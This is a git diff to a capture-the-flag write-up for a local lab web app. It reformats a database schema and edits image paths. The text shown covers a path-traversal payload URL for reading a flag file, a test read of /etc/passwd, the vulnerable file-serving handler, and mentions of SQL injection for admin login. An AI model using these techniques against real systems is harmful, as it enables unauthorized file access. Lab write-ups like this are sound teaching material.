@@ -31,35 +31,22 @@ Now there is an annoying `\'` at the end, we can get rid of it using `--`, comme
 
 After that, we check what does the database look like in `init.sql`
 
->CREATE TABLE IF NOT EXISTS users (
+```text
+CREATE TABLE IF NOT EXISTS users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(100) UNIQUE NOT NULL,
+    password VARCHAR(100) NOT NULL,
+    role VARCHAR(10) NOT NULL DEFAULT 'user'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
 
->    id INT AUTO_INCREMENT PRIMARY KEY,
-
->    username VARCHAR(100) UNIQUE NOT NULL,
-
->    password VARCHAR(100) NOT NULL,
-
->    role VARCHAR(10) NOT NULL DEFAULT 'user'
-
->) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
-
->
-
->
-
->CREATE TABLE IF NOT EXISTS anime (
-
->    id INT AUTO_INCREMENT PRIMARY KEY,
-
->    title TEXT NOT NULL,
-
->    image_url TEXT NOT NULL,
-
->    genres TEXT NOT NULL,
-
->    description TEXT NOT NULL
-
->) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
+CREATE TABLE IF NOT EXISTS anime (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    title TEXT NOT NULL,
+    image_url TEXT NOT NULL,
+    genres TEXT NOT NULL,
+    description TEXT NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;
+```
 
 We then see the users and the anime table. Because the first part of the SQL command reads all `5` attributes in the anime table, 
 >SELECT * FROM anime
@@ -82,6 +69,7 @@ Also from trials and errors, we have to put an additional space after the commen
 ![version](./images/vers.png)
 After logging in with `admin` account, we'll see this:
 >No filename provided
+
 After we check app.py again to see how /admin work:
 
 >    filename = request.args.get('filename', None)
@@ -95,7 +83,7 @@ After we check app.py again to see how /admin work:
 >    return open(os.path.join('files/', filename),'rb').read()
 
 We have to put `?filename=something` in the url for the server to show us. After one quick test with `/etc/passwd`, we know it's an absolute path
-![path](ab.png)
+![path](./imagesab.png)
 The `app/Dockerfile` will tell us where the flag is
 ```text
 ARG directory=/this_is_fake_directory_in_prod_this_is_random
@@ -106,7 +94,7 @@ The final payload is
 ```text
 http://127.0.0.1:5000/admin?filename=/this_is_fake_directory_in_prod_this_is_random/flag.txt
 ```
-![end](payl.png)
+![end](./imagespayl.png)
 ### Flag
 flag{fake_flag}
 
